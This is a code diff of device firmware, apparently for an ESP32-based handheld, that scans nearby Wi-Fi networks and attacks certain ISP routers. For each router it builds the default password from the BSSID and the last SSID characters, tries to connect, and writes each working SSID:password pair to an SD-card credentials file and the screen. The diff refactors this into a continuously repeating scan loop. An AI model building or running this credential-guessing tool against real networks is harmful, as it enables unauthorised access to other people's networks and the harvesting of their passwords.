@@ -11,7 +11,9 @@
 
 #define SD_CREDS_PATH "/dpwoCreds.txt"
 
-void removeColonFromBSSID(char* bssidWithoutColon, const char* bssid) {
+int apScanned = 0;
+
+void parseBSSID(char* bssidWithoutColon, const char* bssid) {
   int j = 0;
   for (int i = 0; i < strlen(bssid); ++i) {
     if (bssid[i] != ':') {
@@ -22,97 +24,79 @@ void removeColonFromBSSID(char* bssidWithoutColon, const char* bssid) {
 }
 
 void netAp(int i) {
-
-        char bssidWithoutColon[18]; 
-        removeColonFromBSSID(bssidWithoutColon, WiFi.BSSIDstr(i).c_str());
-
-        Serial.println("MAC addr");
-        Serial.println(bssidWithoutColon);
-        
-        char *bssidReady = bssidWithoutColon + 4; 
-
-        bssidReady[strlen(bssidReady)-2] = '\0';
-
-        int ssidLength = WiFi.SSID(i).length();
-
-        if (ssidLength >= 2) {
-            String lastTwo = WiFi.SSID(i).substring(ssidLength - 2);
-
-            strcat(bssidReady, lastTwo.c_str());
-
-        } else {
-            Serial.println("ERROR");
-        }
-
-
-        WiFi.begin(WiFi.SSID(i).c_str(), bssidReady);
-
-        // TODO: Dont depend on delays and compare the wifi status other way :P
-        delay(5000);
-        while (WiFi.status() != WL_CONNECTED) {
-          Serial.println("\nNOPE");    
-          WiFi.disconnect();
-
-          return;
-        }
-
-        Serial.println("\nWiFi Connected");
-        WiFi.disconnect();
-        #if defined(SDCARD)
-        appendToFile(SD, SD_CREDS_PATH, String(WiFi.SSID(i) + ":" + bssidReady).c_str());
-        Serial.println("\nWrote creds to SD");
-        #endif
-        DISP.setTextSize(TINY_TEXT);
-        DISP.setTextColor(GREEN, BGCOLOR);
-        DISP.println(String(WiFi.SSID(i) + ":" + bssidReady).c_str());
-        
-
+  char bssidWithoutColon[18]; 
+  parseBSSID(bssidWithoutColon, WiFi.BSSIDstr(i).c_str());
+  Serial.println("MAC addr");
+  Serial.println(bssidWithoutColon);
+  
+  char *bssidReady = bssidWithoutColon + 4; 
+  bssidReady[strlen(bssidReady)-2] = '\0';
+  int ssidLength = WiFi.SSID(i).length();
+  if (ssidLength >= 2) {
+      String lastTwo = WiFi.SSID(i).substring(ssidLength - 2);
+      strcat(bssidReady, lastTwo.c_str());
+  } else {
+      Serial.println("ERROR");
+  }
+  WiFi.begin(WiFi.SSID(i).c_str(), bssidReady);
+  // TODO: Dont depend on delays and compare the wifi status other way :P
+  delay(2000);
+  while (WiFi.status() != WL_CONNECTED) {
+    Serial.println("\nNOPE");    
+    WiFi.disconnect();
+    return;
+  }
+  Serial.println("\nWiFi Connected");
+  WiFi.disconnect();
+  #if defined(SDCARD)
+  appendToFile(SD, SD_CREDS_PATH, String(WiFi.SSID(i) + ":" + bssidReady).c_str());
+  Serial.println("\nWrote creds to SD");
+  #endif
+  DISP.setTextSize(TINY_TEXT);
+  DISP.setTextColor(GREEN, BGCOLOR);
+  DISP.println(String(WiFi.SSID(i) + ":" + bssidReady).c_str());
 }
 
 void claroAp(int i) {
-
-        char bssidWithoutColon[18]; 
-        removeColonFromBSSID(bssidWithoutColon, WiFi.BSSIDstr(i).c_str());
-
-        Serial.println("MAC addr");
-        Serial.println(bssidWithoutColon);
-        
-        char *bssidReady = bssidWithoutColon + 4; 
-
-        bssidReady[strlen(bssidReady)-2] = '\0';
-
-        int ssidLength = WiFi.SSID(i).length();
-
-        WiFi.begin(WiFi.SSID(i).c_str(), bssidReady);
-
-
-        delay(5000);
-        while (WiFi.status() != WL_CONNECTED) {
-          Serial.println("\nNOPE");    
-          WiFi.disconnect();
-          return;
-        }
-
-        Serial.println("\nWiFi Connected");
-        WiFi.disconnect();
-        #if defined(SDCARD)
-        appendToFile(SD, SD_CREDS_PATH, String(WiFi.SSID(i) + ":" + bssidReady).c_str());
-        Serial.println("\nWrote creds to SD");
-        #endif
-        DISP.setTextSize(TINY_TEXT);
-        DISP.setTextColor(GREEN, BGCOLOR);
-        DISP.println(String(WiFi.SSID(i) + ":" + bssidReady).c_str());
-        
-
+  char bssidWithoutColon[18]; 
+  parseBSSID(bssidWithoutColon, WiFi.BSSIDstr(i).c_str());
+  Serial.println("MAC addr");
+  Serial.println(bssidWithoutColon);
+  
+  char *bssidReady = bssidWithoutColon + 4; 
+  bssidReady[strlen(bssidReady)-2] = '\0';
+  int ssidLength = WiFi.SSID(i).length();
+  WiFi.begin(WiFi.SSID(i).c_str(), bssidReady);
+  delay(2000);
+  while (WiFi.status() != WL_CONNECTED) {
+    Serial.println("\nNOPE");    
+    WiFi.disconnect();
+    return;
+  }
+  Serial.println("\nWiFi Connected");
+  WiFi.disconnect();
+  #if defined(SDCARD)
+  appendToFile(SD, SD_CREDS_PATH, String(WiFi.SSID(i) + ":" + bssidReady).c_str());
+  Serial.println("\nWrote creds to SD");
+  #endif
+  DISP.setTextSize(TINY_TEXT);
+  DISP.setTextColor(GREEN, BGCOLOR);
+  DISP.println(String(WiFi.SSID(i) + ":" + bssidReady).c_str());
 }
 
+
 void dpwoSetup() {
-  int apScanned = 0;
   Serial.println("Scanning for DPWO...");
   WiFi.mode(WIFI_STA);
   apScanned = WiFi.scanNetworks();
   Serial.println(apScanned);
 
+
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+
+}
+
+void dpwoLoop(){
   if (apScanned == 0) {
     DISP.println("no networks found");
   } else {
@@ -144,13 +128,13 @@ void dpwoSetup() {
 
 
   }
-  DISP.println("EOF");
-  DISP.setTextColor(FGCOLOR, BGCOLOR);
-  Serial.println("EOF");
+  Serial.println("scanning again");
+  apScanned = WiFi.scanNetworks();
+
+  //TODO: append vulnerable APs and dont repeat the output
+  DISP.println("======");
+
 }
 
-void dpwo_loop(){
-
-}
 
 
